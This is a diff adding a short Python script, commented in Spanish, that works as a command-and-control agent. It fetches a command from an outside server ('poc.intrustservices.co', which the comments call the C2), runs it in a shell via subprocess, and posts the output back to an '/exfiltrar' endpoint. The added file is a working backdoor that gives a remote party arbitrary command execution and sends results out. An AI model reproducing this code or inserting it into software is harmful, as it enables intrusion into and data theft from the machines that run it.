@@ -1,0 +1,20 @@
+import requests
+import subprocess
+
+# La dirección del servidor C2
+url_servidor = "http://poc.intrustservices.co"
+
+# Obtener comando
+respuesta = requests.get(f"{url_servidor}/comando")
+comando = respuesta.text
+
+try:
+    # Ejecutar el comando recibido y capturar la salida
+    resultado = subprocess.check_output(comando, stderr=subprocess.STDOUT, shell=True, timeout=30, universal_newlines=True)
+except subprocess.CalledProcessError as e:
+    resultado = f"Error al ejecutar el comando: {e.output}"
+except Exception as e:
+    resultado = f"Excepción al ejecutar el comando: {str(e)}"
+
+# Exfiltrar datos
+requests.post(f"{url_servidor}/exfiltrar", data=resultado.encode('utf-8'))
